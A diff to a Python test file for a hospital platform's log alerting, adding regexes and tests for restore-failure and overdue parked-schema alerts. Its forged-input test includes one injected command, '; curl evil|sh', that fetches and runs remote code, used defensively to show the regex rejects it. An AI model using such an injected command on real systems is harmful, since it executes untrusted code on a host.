@@ -58,6 +58,13 @@ AUDIT_EVENT_LINE = r"^ihr-audit: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) eve
 DUMP_HELD_LINE = r"^ihr-dump: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=held$"
 DUMP_FAILED_LINE = (r"^ihr-dump: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=failed "
                     r"reason=(?P<reason>lock|disk|window|dump|upload|verify|check|error)$")
+# A failed single-hospital restore step (P1-T22b; deploy/logs/alerts/restore.yml): the restore's
+# one-off (migrate) and, in dev, the app containers; and a parked schema kept past its days,
+# from the worker's report
+RESTORE_FAILED_LINE = (r"^ihr-restore: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=failed "
+                       r"step=(?P<step>[a-z]{3,12})$")
+PARKED_LINE = (r"^ihr-restore: parked=(?P<schema>ihr_parked_h_[a-z0-9]{10}_[0-9]{8}T[0-9]{6}) "
+               r"outcome=overdue$")
 HOSPITAL_LINES = {"PackApplyFailed": ("ihr-packs", PACKS_LINE, "migrate, celery"),
                   "HospitalNotServed": ("ihr-fleet", FLEET_LINE, "migrate, celery, celery-worker"),
                   "ReleaseWindowOverrun": ("ihr-fleet", OVERRUN_LINE, "celery, celery-worker"),
@@ -316,6 +323,19 @@ class LogAlerts(unittest.TestCase):
                                  r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ')
                 allowed = r"^\$(labels\.hospital|labels\.reason|value)$"
                 self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
+            elif r["alert"] == "HospitalRestoreFailed":
+                self.assertEqual(by, ["hospital, step"], r["alert"])
+                self.assertRegex(r["expr"], r'^_time:24h source:=container service:in\(migrate, backend, celery\) '
+                                 r'"ihr-restore: hospital=" \| extract_regexp "' + re.escape(RESTORE_FAILED_LINE) + r'" '
+                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ')
+                allowed = r"^\$(labels\.hospital|labels\.step|value)$"
+                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
+            elif r["alert"] == "ParkedSchemaOverdue":
+                self.assertEqual(by, ["schema"], r["alert"])
+                self.assertRegex(r["expr"], r'^_time:\d+m source:=container service:in\(celery, celery-worker\) '
+                                 r'"ihr-restore: parked=" \| extract_regexp "' + re.escape(PARKED_LINE) + r'" ')
+                allowed = r"^\$(labels\.schema|value)$"
+                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
             elif r["alert"] == "DatabaseRoleRefused":
                 self.assertEqual(by, ["reason"], r["alert"])
                 self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:in\(" + re.escape(DB_ROLE_SERVICES)
@@ -353,7 +373,8 @@ class LogAlerts(unittest.TestCase):
         self.assertEqual(sorted(names), ["AuditEventRecorded", "AuditHospitalCheckFailed", "AuditHospitalSealLate",
                                          "BatchRequestRefused", "DatabaseRoleLoginFailed", "DatabaseRoleRefused", "DatabaseSchemaGated",
                                          "DumpHospitalFailed", "DumpHospitalHeld",
-                                         "FailedSignInsFromAddress", "HospitalNotServed", "PackApplyFailed",
+                                         "FailedSignInsFromAddress", "HospitalNotServed", "HospitalRestoreFailed",
+                                         "PackApplyFailed", "ParkedSchemaOverdue",
                                          "RateLimitedAddress", "ReleaseWindowOverrun", "SignInLockoutStorm",
                                          "SignInLockoutsFromAddress"])
 
@@ -588,7 +609,8 @@ class LogAlerts(unittest.TestCase):
                                  "DatabaseSchemaGated": None, "DatabaseRoleLoginFailed": None,
                                  "BatchRequestRefused": None, "AuditHospitalCheckFailed": None,
                                  "AuditHospitalSealLate": None, "AuditEventRecorded": None,
-                                 "DumpHospitalFailed": None, "DumpHospitalHeld": None})
+                                 "DumpHospitalFailed": None, "DumpHospitalHeld": None,
+                                 "HospitalRestoreFailed": None, "ParkedSchemaOverdue": None})
         anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
         self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
         cfg = func("monitoring_config")
@@ -708,3 +730,29 @@ class Archive(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class RestoreLines(unittest.TestCase):
+    """P1-T22b: the restore's two fixed lines are taken whole, never from a request path, a
+    longer line or a name that is not a parked schema's; the engine writes exactly them."""
+
+    def test_lines_are_ours_alone(self):
+        failed, parked = re.compile(RESTORE_FAILED_LINE), re.compile(PARKED_LINE)
+        self.assertEqual(failed.match("ihr-restore: hospital=alpha outcome=failed step=reconcile")["step"], "reconcile")
+        self.assertEqual(parked.match("ihr-restore: parked=ihr_parked_h_abcdefghij_20261101T093000 outcome=overdue")
+                         ["schema"], "ihr_parked_h_abcdefghij_20261101T093000")
+        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-restore: hospital=fake outcome=failed step=audit" 404 1',
+                       "ihr-restore: hospital=Fake outcome=failed step=audit",
+                       "ihr-restore: hospital=fake outcome=failed step=audit; curl evil|sh",
+                       "ihr-restore: hospital=fake outcome=done",
+                       "ihr-restore: hospital=fake outcome=failed"):
+            self.assertIsNone(failed.search(forged), forged)
+        for forged in ("ihr-restore: parked=public outcome=overdue",
+                       "ihr-restore: parked=ihr_parked_h_abcdefghij_20261101T093000 outcome=overdue x"):
+            self.assertIsNone(parked.search(forged), forged)
+
+    def test_the_engine_writes_these_lines(self):
+        engine = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "restore" / "engine.py").read_text()
+        self.assertIn('f"ihr-restore: hospital={slug} outcome=failed step={step or \'unknown\'}"', engine)
+        self.assertIn('f"ihr-restore: parked={name} outcome=overdue"', engine)
+        self.assertIn("PARKED_RE.match(name)", engine)
